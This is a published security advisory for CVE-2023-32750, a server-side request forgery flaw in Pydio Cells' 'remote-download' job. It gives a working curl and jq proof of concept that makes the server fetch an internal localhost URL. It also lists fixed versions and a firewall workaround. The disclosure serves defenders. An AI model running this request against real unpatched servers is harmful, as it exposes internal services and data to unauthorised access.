For longer running processes, Pydio Cells allows for the creation of
jobs, which are run in the background. The job "remote-download" can be
used to cause the backend to send a HTTP GET request to a specified URL
and save the response to a new file. The response file is then available
in a user-specified folder in Pydio Cells.

Details
=======

Product: Pydio Cells
Affected Versions: 4.1.2 and earlier versions
Fixed Versions: 4.2.0, 4.1.3, 3.0.12
Vulnerability Type: Server-Side Request Forgery
Security Risk: medium
Vendor URL: https://pydio.com/
Vendor Status: notified
Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2023-005
Advisory Status: published
CVE: CVE-2023-32750
CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32750

Introduction
============

"Pydio Cells is an open-core, self-hosted Document Sharing and
Collaboration platform (DSC) specifically designed for organizations
that need advanced document sharing and collaboration without security
trade-offs or compliance issues."

(from the vendor's homepage)

More Details
============

Using the REST-API of Pydio Cells it is possible to start jobs. For
example, when renaming a file or folder an HTTP request similar to the
following is sent:

------------------------------------------------------------------------
PUT /a/jobs/user/move HTTP/2
Host: example.com
User-Agent: agent
Accept: application/json
Authorization: Bearer G4ZRN[...]
Content-Type: application/json
Content-Length: 140

{
"JobName": "move",
"JsonParameters": "{\"nodes\":[\"cell/file.txt\"],\"target\":\"cell/renamed.txt\",\"targetParent\":false}"
}
------------------------------------------------------------------------

The body contains a JSON object with a job name and additional
parameters for the job. Besides the "move" job, also a job with the name
"remote-download" exists. It takes two additional parameters: "urls" and
"target". In the "urls" parameter, a list of URLs can be specified and in
the parameter "target" a path can be specified in which to save the
response. When the job is started, HTTP GET requests are sent from the
Pydio Cells server to the specified URLs. The responses are saved into a
file, which are uploaded to the specified folder within Pydio Cells.
Potential errors are transmitted in a WebSocket channel, which can be
opened through the "/ws/event" endpoint.

Proof of Concept
================

Log into Pydio Cells and retrieve the JWT from the HTTP requests. Then,
run the following commands to start a "remote-download" job to trigger
an HTTP request:

------------------------------------------------------------------------
$ export JWT="<insert JWT here>"

$ echo '{"urls": ["http://localhost:8000/internal.html"], "target": "personal-files"}' \
| jq '{"JobName": "remote-download", "JsonParameters": (. | tostring)}' \
| tee remote-download.json

$ curl --header "Authorization: Bearer $JWT" \
--header 'Content-Type: application/json' \
--request PUT \
--data @remote-download.json 'https://example.com/a/jobs/user/remote-download'
------------------------------------------------------------------------

The URL in the JSON document specifies which URL to request. The "target"
field in the same document specifies into which folder the response is saved.
Afterwards, the response is contained in a file in the specified folder.
Potential errors are communicated through the WebSocket channel.

Workaround
==========

Limit the services which can be reached by the Pydio Cells server, for
example using an outbound firewall.

Fix
===

Upgrade Pydio Cells to a version without the vulnerability.

Security Risk
=============

The risk is highly dependent on the environment in which the attacked
Pydio Cells instance runs. If there are any internal HTTP services which
expose sensitive data on the same machine or within the same network,
the server-side request forgery vulnerability could pose a significant
risk. In other circumstances, the risk could be negligible. Therefore,
overall the vulnerability is rated as a medium risk.
